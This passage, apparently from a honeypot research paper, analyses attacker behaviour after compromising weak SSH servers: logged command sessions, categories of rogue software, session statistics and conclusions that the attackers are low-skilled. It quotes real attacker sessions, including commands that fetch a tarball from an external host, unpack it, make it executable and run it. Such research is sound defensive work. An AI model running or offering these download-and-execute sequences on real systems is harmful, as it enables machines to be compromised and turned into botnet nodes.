The following command sequence was observed during the analysis:
- `9:53:58 mkdir " "`
- `9:54:00 cd " "`
- `9:54:03 ls wget`
- `9:54:07 /sbin/ifconfig`
- `9:54:31 wget`

- `9:57:18 wget www.almerimur.com/capella/linux.tar.gz`

### File Analysis
To analyze the nature of the extracted files, we submitted them to the VirusTotal web service [7]. Approximately 50% of the files were identified using VirusTotal, while the remaining 50% were manually identified through their source code. Figure 2 provides a breakdown of the categories and volume of files downloaded by attackers during the data collection period. The figure indicates a growing popularity of our honeypots over time, with a gap in August 2007 due to a change in IP addresses.

### Main Interests of Attackers
- **IRCBots (Mech-based IRCBots [8]):** The primary interest of attackers was to install IRCBots, which are used to make compromised computers part of a botnet. These botnets can be monetized by selling computer resources on the black market [9].
- **Example IRCbot Attack Session:**
  - `13:46:06 cd /var/tmp`
  - `13:46:11 wget http://www.shaq.profesor.info/like/error.tar.gz`
  - `13:46:16 tar xzvf error.tar.gz`
  - `13:46:18 rm -rf error.tar.gz`
  - `13:46:19 cd error`
  - `13:46:21 chmod +x *`
  - `13:46:22 ./x`
  - `13:46:28 exit`

### Other Popular Software
- **Bouncers (Psybnc-based [10]):** Programs used to relay network connections, often to hide the attacker's source IP address and hostname.
- **Attack Tools:** Various programs used to compromise the computer, including non-malicious software like rogue SSH servers and malicious tools like john-the-ripper [11], log cleaners, process hiders, and network sniffers.
- **Rootkits:** System exploits and rogue binaries to gain root privileges.
- **Network Scanners:** Software to automatically probe for listening SSH servers or perform port scans.
- **Flooders:** Network applications for launching denial-of-service attacks [13].
- **Backdoors:** Programs for stealthy and remote control of the compromised computer.
- **Files:** Non-malicious files such as movie trailers, drivers, and Windows update patches. Some attackers used the compromised computer for storage, and one even attempted to turn it into a CounterStrike game server.

### Session Analysis
- **File Categorization:** Each session was labeled based on the type of file downloaded. In 58 out of 379 sessions, attackers downloaded more than one type of file. This number increases to 158 when aggregating files per attack instead of per session.
- **Auxiliary Sessions:** Attackers often used auxiliary sessions to download additional files or perform other tasks in parallel. These sessions were linked using the source IP and a 24-hour time window.
- **Delay Before Exploit:** On average, it took between 2 minutes 14 seconds and 30 minutes for attackers to deploy their rogue software in main sessions.

### Discussion on Attackers
The data analyzed suggests that attackers targeting weakly secured SSH servers are generally low-skilled humans. The large number of typos and the timing between commands indicate that these attacks are rarely automated but rather performed by human beings using interactive terminals. Automated scripts are predominantly used for scanning and finding SSH servers to compromise, but once logged in, attackers proceed manually. Further evidence of low skill levels is found in the relatively low percentage of attackers who attempted to hide their intrusions and the high volume of incomplete attacks due to missing system tools or invalid URLs.

### Related Work
- **[15]**: In-depth forensic analysis of post-compromise attacker behavior, focusing on more sophisticated attackers.
- **[16]**: Analysis of login attempts on a single honeypot over 22 days, using a modified SSH server to collect password attempts.
- **[14]**: Collection of SSH intrusions over six months from 35 attackers, concluding that attackers targeting weakly secured SSH servers were low-skilled.

### Conclusions
- **Typical Attack Session:** Checking system configuration, changing system configuration, downloading, installing, and running rogue software.
- **Rogue Software Types:** IRC bots, bouncers, attack tools, rootkits, network scanners, flooders, and backdoor programs.
- **Multiple Sessions:** Attackers often launched more than one attack session at a time.
- **Unused Software:** In 27% of sessions, attackers downloaded software that was never used, indicating the need for more time before redeploying the honeypot.
